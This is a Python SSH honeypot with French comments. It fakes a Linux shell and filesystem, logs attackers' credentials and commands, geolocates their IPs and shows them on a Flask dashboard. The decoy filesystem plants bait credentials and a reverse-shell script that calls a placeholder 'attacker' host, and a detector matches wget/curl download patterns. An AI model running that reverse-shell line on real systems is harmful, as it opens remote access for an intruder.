import paramiko
import socket
import threading
import time
import os
import re
import json
import requests
from datetime import datetime, timedelta
from flask import Flask, render_template_string

# ---------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------
# Fichiers de logs
AUTH_LOG = 'auth.log'        # Journal des tentatives de connexion SSH
CMD_LOG = 'commands.log'      # Journal des commandes exécutées
ALERT_LOG = 'alerts.log'      # Journal des alertes (détections d'exploits, force brute, etc.)

BRUTE_FORCE_THRESHOLD = 3     # Seuil à partir duquel on considère une attaque par force brute
IP_API_URL = "http://ip-api.com/json/{}"  # API pour géolocaliser l'adresse IP
BANNED_IPS = set()            # Ensemble des IP bannies pour cause de force brute

# Application Flask pour le dashboard
app = Flask(__name__)

# ---------------------------------------------------------------
# Génération/Récupération de la clé SSH
# ---------------------------------------------------------------
# La clé SSH persistante est stockée dans KEY_FILE. Si le fichier n'existe pas,
# on génère une nouvelle clé RSA et on la sauvegarde.
KEY_FILE = "server.key"
if not os.path.exists(KEY_FILE):
    server_key = paramiko.RSAKey.generate(2048)
    server_key.write_private_key_file(KEY_FILE)
else:
    server_key = paramiko.RSAKey(filename=KEY_FILE)

# ---------------------------------------------------------------
# Système de fichiers réaliste et enrichi
# ---------------------------------------------------------------
class RealisticFileSystem:
    """
    Cette classe gère l'arborescence fictive du système de fichiers.
    Elle propose des méthodes pour naviguer, créer et supprimer des
    répertoires ou fichiers, de façon à simuler un environnement Linux réel.
    """
    def __init__(self):
        # Le répertoire courant de l'utilisateur "root" ou "user"
        self.current_dir = '/home/user'
        
        # Arborescence du système, stockée sous forme de dictionnaires imbriqués
        self.file_tree = {
            '/': {
                # Repertoires binaires
                'bin': {
                    'ls': 'binary content',
                    'bash': 'binary content',
                    'sh': 'binary content',
                    'cp': 'binary content',
                    'mv': 'binary content',
                    'rm': 'binary content',
                    'mkdir': 'binary content'
                },
                'sbin': {
                    'ifconfig': 'binary content',
                    'iptables': 'binary content'
                },
                'etc': {
                    'passwd': self._gen_passwd(),
                    'shadow': 'root:*:19239:0:99999:7:::\nuser:*:19239:0:99999:7:::',
                    'hosts': '127.0.0.1 localhost\n192.168.1.10 server-prod-01',
                    'resolv.conf': 'nameserver 8.8.8.8\n',
                    'motd': 'Welcome to Ubuntu 20.04 LTS\n',
                    'ssh': {
                        'sshd_config': '# Port 22\n# PermitRootLogin yes\n'
                    },
                    'ssl': {
                        'server.crt': "-----BEGIN CERTIFICATE-----\nFAKECERTDATA\n-----END CERTIFICATE-----\n",
                        'server.key': "-----BEGIN PRIVATE KEY-----\nFAKEKEYDATA\n-----END PRIVATE KEY-----\n"
                    }
                },
                'home': {
                    'user': {
                        'Documents': {
                            'notes.txt': 'Important: changer de mot de passe tous les mois!\n',
                            'todo.txt': '1. Mettre à jour le système\n2. Vérifier les logs\n3. Scanner le réseau\n',
                            'confidential.docx': 'Détails du projet ultra-secret…',
                            'financials.xlsx': 'Revenus, coûts, profits...'
                        },
                        'Downloads': {
                            'movie.mp4': b'FAKE_VIDEO_DATA',
                            'photo.jpg': b'FAKE_IMAGE_DATA',
                            'db_backup.sql': '-- SQL Backup de la base confidentielle\nCREATE TABLE secrets (...);'
                        },
                        '.ssh': {
                            'authorized_keys': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakekey user@local',
                            'id_rsa': "-----BEGIN RSA PRIVATE KEY-----\nFAKE_PRIVATE_KEY_DATA\n-----END RSA PRIVATE KEY-----\n"
                        },
                        '.bash_history': 'ls -la\ncd /etc\ncat passwd\npwd\nexit\n'
                    },
                    'admin': {
                        'secret_stuff': {
                            'admin_notes.txt': 'Ne pas partager ce fichier.\nMot de passe root: root1234\n'
                        }
                    }
                },
                'root': {
                    'flag.txt': 'FLAG{this_is_a_fake_flag}\n',
                    'secrets.txt': 'Admin passwords: admin:123456, guest:guest\n',
                    'private.key': "-----BEGIN RSA PRIVATE KEY-----\nFAKE_PRIVATE_KEY\n-----END RSA PRIVATE KEY-----\n",
                    'admin_credentials.txt': 'username: admin\npassword: supersecret'
                },
                'var': {
                    'log': {
                        'auth.log': self._gen_auth_log(),
                        'syslog': 'System log data...\n',
                        'dpkg.log': 'Log d’installation de paquets...\n'
                    },
                    'www': {
                        'index.html': '<html><body>Fake website</body></html>'
                    },
                    'spool': {
                        'cron': {
                            'root': '# Cronjobs pour root\n0 0 * * * /usr/bin/apt update\n'
                        }
                    }
                },
                'tmp': {
                    'temp.txt': 'Fichier temporaire...\n'
                },
                'proc': {
                    '1': {'cmdline': '/sbin/init', 'status': 'Name:\tinit'},
                    '123': {'cmdline': '/usr/sbin/sshd', 'status': 'Name:\tsshd'}
                },
                'dev': {
                    'null': None,
                    'zero': None,
                    'random': None
                },
                'tools': {
                    'nmap': 'nmap binary',
                    'metasploit': 'msfconsole binary',
                    'hydra': 'hydra binary',
                    'john': 'john the ripper binary'
                },
                'payloads': {
                    'reverse_shell.sh': '#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1\n',
                    'keylogger.py': 'print("Keylogger running...")\n'
                },
                'exploits': {
                    'cve-2020-1234.py': '# Exploit code for CVE-2020-1234\n',
                    'buffer_overflow.c': '/* Sample buffer overflow exploit */\nint main(){return 0;}'
                },
                'usr': {
                    'local': {
                        'bin': {
                            'custom_app': 'binary content'
                        }
                    }
                },
                'opt': {
                    'malware': {
                        'ransomware.exe': 'binary content'
                    }
                },
                'lib': {
                    'libc.so.6': 'binary content'
                },
                'boot': {
                    'grub': {
                        'grub.cfg': '# Fake GRUB config\n'
                    }
                },
                'media': {},
                'mnt': {}
            }
        }

    def _gen_passwd(self):
        """
        Génère un contenu fictif pour le fichier /etc/passwd.
        """
        return "\n".join([
            "root:x:0:0:root:/root:/bin/bash",
            "user:x:1000:1000:User Name,,,:/home/user:/bin/bash",
            "admin:x:1001:1001:Admin User,,,:/home/admin:/bin/bash"
        ]) + "\n"

    def _gen_auth_log(self):
        """
        Génère un log fictif d'échecs de connexions sur 30 jours.
        """
        log = []
        for i in range(1, 31):
            date = datetime.now() - timedelta(days=30 - i)
            log.append(f"{date.strftime('%b %d %H:%M:%S')} sshd[1234]: Failed password for root from 192.168.1.{i} port 22")
        return "\n".join(log) + "\n"

    def resolve_path(self, path):
        """
        Convertit un chemin relatif en chemin absolu basé sur current_dir.
        """
        if path.startswith('/'):
            return os.path.normpath(path)
        return os.path.normpath(os.path.join(self.current_dir, path))

    def _get_node(self, path):
        """
        Parcourt l'arborescence pour retourner le noeud (fichier ou répertoire)
        correspondant au chemin fourni.
        """
        if path == '/':
            return self.file_tree['/']
        parts = [p for p in path.split('/') if p]
        node = self.file_tree['/']
        for part in parts:
            if isinstance(node, dict) and part in node:
                node = node[part]
            else:
                return None
        return node

    def list_dir(self, path='.'):
        """
        Liste le contenu du répertoire spécifié.
        """
        target_path = self.resolve_path(path)
        node = self._get_node(target_path)
        if isinstance(node, dict):
            return list(node.keys())
        return []

    def get_file(self, path):
        """
        Récupère le contenu d'un fichier (ou le noeud correspondant).
        """
        target_path = self.resolve_path(path)
        return self._get_node(target_path)

    def copy_file(self, src, dest):
        """
        Copie un fichier du chemin src vers dest dans l'arborescence simulée.
        """
        src_path = self.resolve_path(src)
        dest_path = self.resolve_path(dest)
        content = self._get_node(src_path)
        if content is None:
            raise Exception("source file not found")
        if isinstance(content, dict):
            raise Exception("cannot copy a directory")
        dest_parent, dest_name = os.path.split(dest_path)
        parent_node = self._get_node(dest_parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("destination directory not found")
        parent_node[dest_name] = content

    def move_file(self, src, dest):
        """
        Déplace un fichier de src à dest.
        """
        src_path = self.resolve_path(src)
        dest_path = self.resolve_path(dest)
        content = self._get_node(src_path)
        if content is None:
            raise Exception("source file not found")
        if isinstance(content, dict):
            raise Exception("cannot move a directory")
        dest_parent, dest_name = os.path.split(dest_path)
        parent_node = self._get_node(dest_parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("destination directory not found")
        parent_node[dest_name] = content
        # Suppression du fichier source
        src_parent, src_name = os.path.split(src_path)
        src_parent_node = self._get_node(src_parent)
        if src_parent_node is None or not isinstance(src_parent_node, dict):
            raise Exception("source directory not found")
        if src_name in src_parent_node:
            del src_parent_node[src_name]

    def mkdir(self, path):
        """
        Crée un nouveau répertoire dans l'arborescence virtuelle.
        """
        abs_path = self.resolve_path(path)
        parent, new_dir = os.path.split(abs_path)
        parent_node = self._get_node(parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("Parent directory not found")
        if new_dir in parent_node:
            raise Exception("Directory already exists")
        parent_node[new_dir] = {}

    def touch(self, path):
        """
        Crée un nouveau fichier vide.
        """
        abs_path = self.resolve_path(path)
        parent, filename = os.path.split(abs_path)
        parent_node = self._get_node(parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("Parent directory not found")
        if filename not in parent_node:
            parent_node[filename] = ""

    def rm(self, path):
        """
        Supprime un fichier (mais pas un répertoire).
        """
        abs_path = self.resolve_path(path)
        parent, filename = os.path.split(abs_path)
        parent_node = self._get_node(parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("Parent directory not found")
        if filename not in parent_node:
            raise Exception("File not found")
        if isinstance(parent_node[filename], dict):
            raise Exception("rm: cannot remove directory")
        del parent_node[filename]

    def rmdir(self, path):
        """
        Supprime un répertoire vide.
        """
        abs_path = self.resolve_path(path)
        node = self._get_node(abs_path)
        if node is None:
            raise Exception("Directory not found")
        if not isinstance(node, dict):
            raise Exception("Not a directory")
        if node:
            raise Exception("Directory not empty")
        parent, dirname = os.path.split(abs_path)
        parent_node = self._get_node(parent)
        if parent_node is None or not isinstance(parent_node, dict):
            raise Exception("Parent directory not found")
        del parent_node[dirname]

# ---------------------------------------------------------------
# Détecteur d'intrusion (force brute)
# ---------------------------------------------------------------
class IntrusionDetector:
    """
    Classe permettant de détecter les attaques par force brute en suivant
    le nombre de tentatives de connexion par IP. Si une IP dépasse le seuil
    BRUTE_FORCE_THRESHOLD, elle est bannie.
    """
    def __init__(self):
        self.attempts = {}

    def check_brute_force(self, ip):
        """
        Incrémente le compteur pour l'adresse IP. Si le seuil est dépassé,
        on considère qu'il s'agit d'une attaque par force brute.
        """
        if ip in BANNED_IPS:
            return True
        self.attempts[ip] = self.attempts.get(ip, 0) + 1
        if self.attempts[ip] >= BRUTE_FORCE_THRESHOLD:
            BANNED_IPS.add(ip)
            self.log_alert(f"Brute force attack detected from {ip}")
            return True
        return False

    def log_alert(self, message):
        """
        Écrit un message d'alerte dans ALERT_LOG.
        """
        with open(ALERT_LOG, 'a') as f:
            f.write(f"[{datetime.now()}] ALERT: {message}\n")

# ---------------------------------------------------------------
# Gestionnaire de commandes (Shell) avec sudo, pipeline et auto-complétion
# ---------------------------------------------------------------
class CombinedCommandHandler:
    """
    Classe principale gérant le shell interactif : commandes internes,
    détection d'exploits, auto-complétion, pipelines, etc.
    """
    def __init__(self, client_ip):
        self.fs = RealisticFileSystem()
        self.client_ip = client_ip
        self.user = 'root'
        self.hostname = 'server-prod-01'
        self.sudo_attempts = 0
        self.command_history = []
        self.prompt = f"{self.user}@{self.hostname}:{self.fs.current_dir}$ "
        self.geo_info = self.get_geo_info()
        
        # Liste de commandes disponibles pour l'auto-complétion
        self.available_cmds = ["ls", "cd", "pwd", "cat", "cp", "mv", "mkdir", "rm",
                               "rmdir", "touch", "echo", "ps", "sudo", "wget", "uname", "exit"]

    def get_geo_info(self):
        """
        Récupère les informations de géolocalisation via l'API IP_API_URL.
        """
        try:
            response = requests.get(IP_API_URL.format(self.client_ip), timeout=2)
            data = response.json()
            if data.get('status') == 'success' and data.get('country'):
                return data
            else:
                return {'country': 'Unknown', 'isp': 'Unknown'}
        except Exception:
            return {'country': 'Unknown', 'isp': 'Unknown'}

    def log_command(self, command):
        """
        Journalise chaque commande exécutée dans CMD_LOG.
        """
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_ip,
            'command': command,
            'geo': self.geo_info,
            'cwd': self.fs.current_dir,
            'user': self.user
        }
        with open(CMD_LOG, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

    def detect_exploits(self, command):
        """
        Détecte certains motifs d'exploits courants (SQL injection, XSS, RCE)
        via des expressions régulières.
        """
        patterns = {
            'sql_injection': r"([';]+\s*(?:--|#|/\*))",
            'xss': r"<script>.*</script>",
            'rce': r"(wget|curl)\s+http://"
        }
        for vuln, pattern in patterns.items():
            if re.search(pattern, command, re.IGNORECASE):
                self.log_alert(f"Potential {vuln} detected: {command}")

    def log_alert(self, message):
        """
        Écrit une alerte dans le fichier ALERT_LOG.
        """
        with open(ALERT_LOG, 'a') as f:
            f.write(f"[{datetime.now()}] ALERT: {message}\n")

    def update_prompt(self):
        """
        Met à jour l'invite de commande (prompt) en fonction du répertoire courant.
        """
        self.prompt = f"{self.user}@{self.hostname}:{self.fs.current_dir}$ "

    def complete(self, current_input):
        """
        Auto-complétion :
        - Si l'utilisateur tape une commande partielle, on propose les commandes disponibles.
        - Sinon, on tente de compléter les noms de fichiers dans le répertoire courant.
        """
        tokens = current_input.strip().split()
        if not tokens:
            return ""
        
        # Complétion de la commande (premier token)
        if len(tokens) == 1:
            possibles = [cmd for cmd in self.available_cmds if cmd.startswith(tokens[0])]
            if len(possibles) == 1:
                return possibles[0][len(tokens[0]):]
            else:
                return " ".join(possibles)
        else:
            # Complétion sur les noms de fichiers
            partial = tokens[-1]
            files = self.fs.list_dir('.')
            possibles = [f for f in files if f.startswith(partial)]
            if len(possibles) == 1:
                return possibles[0][len(partial):]
            else:
                return " ".join(possibles)

    def execute_pipeline(self, command):
        """
        Gère l'exécution des commandes en pipeline (séparées par '|').
        """
        segments = [seg.strip() for seg in command.split("|")]
        output = ""
        for seg in segments:
            output += self.handle_command(seg)
        return output

    def handle_command(self, command):
        """
        Gère la logique d'exécution d'une commande, y compris l'auto-complétion,
        les pipelines, la gestion de sudo, etc.
        """
        self.command_history.append(command)
        self.log_command(command)
        self.detect_exploits(command)

        # Vérifie la présence de '|'
        if "|" in command:
            return self.execute_pipeline(command)

        # Gestion du sudo : on retire 'sudo ' avant l'analyse
        if command.startswith("sudo "):
            if command.strip() == "sudo su":
                # Simule un changement d'utilisateur vers root
                self.user = "root"
                self.update_prompt()
                return ""
            command = command[len("sudo "):]

        parts = command.strip().split()
        if not parts:
            return ""
        cmd = parts[0]
        args = parts[1:]
        
        try:
            if cmd == 'ls':
                # Gère l'option '-l'
                if '-l' in args:
                    path = args[-1] if len(args) > 1 else '.'
                    files = self.fs.list_dir(path)
                    return "\n".join(
                        f"-rw-r--r-- 1 {self.user} {self.user} 4096 {datetime.now().strftime('%b %d %H:%M')} {f}"
                        for f in files
                    ) + "\n"
                else:
                    path = args[0] if args else '.'
                    files = self.fs.list_dir(path)
                    return '  '.join(files) + "\n"

            elif cmd == 'cd':
                new_dir = args[0] if args else '/'
                resolved = self.fs.resolve_path(new_dir)
                node = self.fs._get_node(resolved)
                if node is not None and isinstance(node, dict):
                    self.fs.current_dir = resolved
                    self.update_prompt()
                    return ""
                else:
                    return f"cd: no such file or directory: {new_dir}\n"

            elif cmd == 'pwd':
                return self.fs.current_dir + "\n"

            elif cmd == 'cat':
                if not args:
                    return "cat: missing file operand\n"
                content = self.fs.get_file(args[0])
                if content is None:
                    return "cat: file not found\n"
                if isinstance(content, dict):
                    return "cat: cannot display directory contents\n"
                if isinstance(content, bytes):
                    return "Binary file content cannot be displayed\n"
                return content + "\n"

            elif cmd == 'cp':
                if len(args) < 2:
                    return "cp: missing file operand\n"
                self.fs.copy_file(args[0], args[1])
                return ""

            elif cmd == 'mv':
                if len(args) < 2:
                    return "mv: missing file operand\n"
                self.fs.move_file(args[0], args[1])
                return ""

            elif cmd == 'mkdir':
                if not args:
                    return "mkdir: missing operand\n"
                self.fs.mkdir(args[0])
                return ""

            elif cmd == 'rm':
                if not args:
                    return "rm: missing operand\n"
                self.fs.rm(args[0])
                return ""

            elif cmd == 'rmdir':
                if not args:
                    return "rmdir: missing operand\n"
                self.fs.rmdir(args[0])
                return ""

            elif cmd == 'touch':
                if not args:
                    return "touch: missing file operand\n"
                self.fs.touch(args[0])
                return ""

            elif cmd == 'echo':
                return ' '.join(args) + "\n"

            elif cmd == 'ps':
                return ("  PID TTY          TIME CMD\n"
                        "    1 ?        00:00:00 init\n"
                        "    2 ?        00:00:00 sshd\n")

            elif cmd == 'wget':
                return "Connecting to remote host... File downloaded\n"

            elif cmd == 'uname':
                return "Linux " + self.hostname + " 5.4.0-999-generic\n"

            elif cmd == 'exit':
                return "logout\n"

            else:
                return f"{cmd}: command not found\n"

        except Exception as e:
            return f"Error: {e}\n"

# ---------------------------------------------------------------
# Dashboard Flask amélioré
# ---------------------------------------------------------------
@app.route('/dashboard')
def dashboard():
    """
    Route principale pour afficher les logs (commands.log) dans un tableau
    Bootstrap. Seules les 10 dernières entrées sont affichées.
    """
    logs = []
    try:
        with open(CMD_LOG, 'r') as f:
            for line in f:
                try:
                    logs.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
    except FileNotFoundError:
        logs = []
    
    # Template HTML avec Bootstrap pour un affichage plus moderne
    template = """
    <!doctype html>
    <html lang="fr">
      <head>
        <meta charset="utf-8">
        <title>Honeypot Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
      </head>
      <body>
        <div class="container my-4">
          <h1 class="mb-4">Honeypot Dashboard</h1>
          <table class="table table-striped">
            <thead class="table-dark">
              <tr>
                <th>Time</th>
                <th>IP</th>
                <th>Command</th>
                <th>Country</th>
              </tr>
            </thead>
            <tbody>
              {% for log in logs[-10:] %}
              <tr>
                <td>{{ log.timestamp }}</td>
                <td>{{ log.ip }}</td>
                <td>{{ log.command }}</td>
                <td>{{ log.geo.country }}</td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </body>
    </html>
    """
    return render_template_string(template, logs=logs)

def start_dashboard():
    """
    Lance l'application Flask sur le port 5000 (par défaut).
    """
    app.run(port=5000, use_reloader=False)

# ---------------------------------------------------------------
# Serveur SSH Honeypot
# ---------------------------------------------------------------
class HoneypotServer(paramiko.ServerInterface):
    """
    Classe de gestion du serveur SSH, basé sur Paramiko. Gère
    l'authentification et la création de sessions interactives.
    """
    def __init__(self, client_ip):
        self.client_ip = client_ip
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        """
        Journalise les tentatives de connexion dans AUTH_LOG.
        Accepte toujours l'authentification (honeypot).
        """
        with open(AUTH_LOG, 'a') as f:
            f.write(f"{datetime.now()} | {self.client_ip} | {username}:{password}\n")
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        """
        Accepte les requêtes de session SSH.
        """
        return paramiko.OPEN_SUCCEEDED

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        """
        Accepte les requêtes de pseudo-terminal.
        """
        return True

    def check_channel_shell_request(self, channel):
        """
        Accepte l'ouverture d'un shell interactif.
        """
        self.event.set()
        return True

# ---------------------------------------------------------------
# Gestion de la connexion SSH + Shell (avec auto-complétion Tab)
# ---------------------------------------------------------------
def handle_connection(client_sock, client_ip):
    """
    Gère la connexion d'un client SSH : vérifie la force brute,
    initialise le serveur Paramiko et le shell interactif.
    """
    detector = IntrusionDetector()
    if detector.check_brute_force(client_ip):
        client_sock.close()
        return

    transport = paramiko.Transport(client_sock)
    transport.add_server_key(server_key)
    
    try:
        # Démarre le serveur SSH
        transport.start_server(server=HoneypotServer(client_ip))
        chan = transport.accept(20)
        if not chan:
            transport.close()
            return

        # Création du shell interactif
        handler = CombinedCommandHandler(client_ip)
        
        # Envoie un message de bienvenue
        welcome_msg = "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-999-generic x86_64)\r\n"
        chan.sendall(welcome_msg.encode())
        chan.sendall(handler.prompt.encode())

        command_buffer = ''
        
        while True:
            # Vérifie si le canal a des données à lire
            if chan.recv_ready():
                raw_data = chan.recv(1024)
                if not raw_data:
                    break

                for byte in raw_data:
                    char = chr(byte)
                    
                    # Gestion de la touche Tab pour l'auto-complétion
                    if char == '\t':
                        completion = handler.complete(command_buffer)
                        if completion:
                            # Si une seule complétion, on la complète
                            if " " not in completion:
                                command_buffer += completion
                                chan.sendall(completion.encode())
                            else:
                                # Sinon, on affiche les différentes propositions
                                chan.sendall(b'\r\n' + completion.encode() + b'\r\n')
                                chan.sendall(handler.prompt.encode() + command_buffer.encode())
                        continue
                    
                    # Gestion des retours à la ligne
                    if char in ['\r', '\n']:
                        chan.sendall(b'\r\n')
                        response = handler.handle_command(command_buffer)
                        response = response.rstrip()
                        if response:
                            chan.sendall((response + "\r\n").encode())
                        if command_buffer.strip() == 'exit':
                            chan.close()
                            transport.close()
                            return
                        command_buffer = ''
                        chan.sendall(handler.prompt.encode())
                    
                    # Gestion du backspace
                    elif char == '\x7f':
                        if len(command_buffer) > 0:
                            command_buffer = command_buffer[:-1]
                            chan.sendall(b'\b \b')
                    
                    # Cas général : caractère normal
                    else:
                        command_buffer += char
                        chan.sendall(bytearray([byte]))
            
            if chan.exit_status_ready():
                break
            
            time.sleep(0.1)
        
        chan.close()
        transport.close()
    except Exception:
        transport.close()

# ---------------------------------------------------------------
# Lancement de l'application
# ---------------------------------------------------------------
def main():
    """
    Point d'entrée principal. Crée un socket sur le port 2222 et attend
    les connexions SSH. Démarre en parallèle le dashboard Flask.
    """
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('0.0.0.0', 2222))
    server_sock.listen(100)
    
    print("Honeypot SSH actif sur le port 2222")
    
    try:
        while True:
            client_sock, addr = server_sock.accept()
            print(f"Connexion de {addr[0]}:{addr[1]}")
            threading.Thread(target=handle_connection, args=(client_sock, addr[0])).start()
    except KeyboardInterrupt:
        server_sock.close()

if __name__ == "__main__":
    # Lance le dashboard Flask dans un thread daemon
    threading.Thread(target=start_dashboard, daemon=True).start()
    main()
